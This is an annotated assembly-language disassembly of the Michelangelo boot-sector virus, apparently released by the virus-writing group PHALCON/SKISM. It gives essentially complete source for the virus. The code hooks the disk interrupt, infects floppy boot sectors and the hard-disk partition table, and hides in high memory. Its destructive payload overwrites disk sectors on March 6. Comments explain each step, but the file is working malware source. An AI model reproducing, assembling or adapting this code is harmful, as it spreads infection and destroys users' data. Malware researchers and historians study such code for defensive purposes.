
; This is a disassembly of the much-hyped michelangelo virus.
; As you can see, it is a derivative of the Stoned virus.  The
; junk bytes at the end of the file are probably throwbacks to
; the Stoned virus.  In any case, it is yet another boot sector
; and partition table infector.

michelangelo    segment byte public
		assume  cs:michelangelo, ds:michelangelo
; Disassembly by Dark Angel of PHALCON/SKISM
		org     0

		jmp     entervirus
highmemjmp      db      0F5h, 00h, 80h, 9Fh
maxhead         db      2                       ; used by damagestuff
firstsector     dw      3
oldint13h       dd      0C8000256h

int13h:
		push    ds
		push    ax
		or      dl, dl                  ; default drive?
		jnz     exitint13h              ; exit if not
		xor     ax, ax
		mov     ds, ax
		test    byte ptr ds:[43fh], 1   ; disk 0 on?
		jnz     exitint13h              ; if not spinning, exit
		pop     ax
		pop     ds
		pushf
		call    dword ptr cs:[oldint13h]; first call old int 13h
		pushf
		call    infectdisk              ; then infect
		popf
		retf    2
exitint13h:     pop     ax
		pop     ds
		jmp     dword ptr cs:[oldint13h]

infectdisk:
		push    ax
		push    bx
		push    cx
		push    dx
		push    ds
		push    es
		push    si
		push    di
		push    cs
		pop     ds
		push    cs
		pop     es
		mov     si, 4
readbootblock:
		mov     ax,201h                 ; Read boot block to
		mov     bx,200h                 ; after virus
		mov     cx,1
		xor     dx,dx
		pushf
		call    oldint13h
		jnc     checkinfect             ; continue if no error
		xor     ax,ax
		pushf
		call    oldint13h               ; Reset disk
		dec     si                      ; loop back
		jnz     readbootblock
		jmp     short quitinfect        ; exit if too many failures
checkinfect:
		xor     si,si
		cld
		lodsw
		cmp     ax,[bx]                 ; check if already infected
		jne     infectitnow
		lodsw
		cmp     ax,[bx+2]               ; check again
		je      quitinfect
infectitnow:
		mov     ax,301h                 ; Write old boot block
		mov     dh,1                    ; to head 1
		mov     cl,3                    ; sector 3
		cmp     byte ptr [bx+15h],0FDh  ; 360k disk?
		je      is360Kdisk
		mov     cl,0Eh
is360Kdisk:
		mov     firstsector,cx
		pushf
		call    oldint13h
		jc      quitinfect              ; exit on error
		mov     si,200h+offset partitioninfo
		mov     di,offset partitioninfo
		mov     cx,21h                  ; Copy partition table
		cld
		rep     movsw
		mov     ax,301h                 ; Write virus to sector 1
		xor     bx,bx
		mov     cx,1
		xor     dx,dx
		pushf
		call    oldint13h
quitinfect:
		pop     di
		pop     si
		pop     es
		pop     ds
		pop     dx
		pop     cx
		pop     bx
		pop     ax
		retn
entervirus:
		xor     ax,ax
		mov     ds,ax
		cli
		mov     ss,ax
		mov     ax,7C00h                ; Set stack to just below
		mov     sp,ax                   ; virus load point
		sti
		push    ds                      ; save 0:7C00h on stack for
		push    ax                      ; later retf
		mov     ax,ds:[13h*4]
		mov     word ptr ds:[7C00h+offset oldint13h],ax
		mov     ax,ds:[13h*4+2]
		mov     word ptr ds:[7C00h+offset oldint13h+2],ax
		mov     ax,ds:[413h]            ; memory size in K
		dec     ax                      ; 1024 K
		dec     ax
		mov     ds:[413h],ax            ; move new value in
		mov     cl,6
		shl     ax,cl                   ; ax = paragraphs of memory
		mov     es,ax                   ; next line sets seg of jmp
		mov     word ptr ds:[7C00h+2+offset highmemjmp],ax
		mov     ax,offset int13h
		mov     ds:[13h*4],ax
		mov     ds:[13h*4+2],es
		mov     cx,offset partitioninfo
		mov     si,7C00h
		xor     di,di
		cld
		rep     movsb                   ; copy to high memory
						; and transfer control there
		jmp     dword ptr cs:[7C00h+offset highmemjmp]
; destination of highmem jmp
		xor     ax,ax
		mov     es,ax
		int     13h                     ; reset disk
		push    cs
		pop     ds
		mov     ax,201h
		mov     bx,7C00h
		mov     cx,firstsector
		cmp     cx,7                    ; hard disk infection?
		jne     floppyboot              ; if not, do floppies
		mov     dx,80h                  ; Read old partition table of
		int     13h                     ; first hard disk to 0:7C00h
		jmp     short exitvirus
floppyboot:
		mov     cx,firstsector          ; read old boot block
		mov     dx,100h                 ; to 0:7C00h
		int     13h
		jc      exitvirus
		push    cs
		pop     es
		mov     ax,201h                 ; read boot block
		mov     bx,200h                 ; of first hard disk
		mov     cx,1
		mov     dx,80h
		int     13h
		jc      exitvirus
		xor     si,si
		cld
		lodsw
		cmp     ax,[bx]                 ; is it infected?
		jne     infectharddisk          ; if not, infect HD
		lodsw                           ; check infection
		cmp     ax,[bx+2]
		jne     infectharddisk
exitvirus:
		xor     cx,cx                   ; Real time clock get date
		mov     ah,4                    ; dx = mon/day
		int     1Ah
		cmp     dx,306h                 ; March 6th
		je      damagestuff
		retf                            ; return control to original
						; boot block @ 0:7C00h
damagestuff:
		xor     dx,dx
		mov     cx,1
smashanothersector:
		mov     ax,309h
		mov     si,firstsector
		cmp     si,3
		je      smashit
		mov     al,0Eh
		cmp     si,0Eh
		je      smashit
		mov     dl,80h                  ; first hard disk
		mov     maxhead,4
		mov     al,11h
smashit:
		mov     bx,5000h                ; random memory area
		mov     es,bx                   ; at 5000h:5000h
		int     13h                     ; Write al sectors to drive dl
		jnc     skiponerror             ; skip on error
		xor     ah,ah                   ; Reset disk drive dl
		int     13h
skiponerror:
		inc     dh                      ; next head
		cmp     dh,maxhead              ; 2 if floppy, 4 if HD
		jb      smashanothersector
		xor     dh,dh                   ; go to next head/cylinder
		inc     ch
		jmp     short smashanothersector
infectharddisk:
		mov     cx,7                    ; Write partition table to
		mov     firstsector,cx          ; sector 7
		mov     ax,301h
		mov     dx,80h
		int     13h
		jc      exitvirus
		mov     si,200h+offset partitioninfo ; Copy partition
		mov     di,offset partitioninfo      ; table information
		mov     cx,21h
		rep     movsw
		mov     ax,301h                 ; Write to sector 8
		xor     bx,bx                   ; Copy virus to sector 1
		inc     cl
		int     13h
;*              jmp     short 01E0h
		db      0EBh, 32h               ; ?This should crash?
; The following bytes are meaningless.
garbage         db      1,4,11h,0,80h,0,5,5,32h,1,0,0,0,0,0,53h
partitioninfo:  db      42h dup (0)
michelangelo    ends
		end
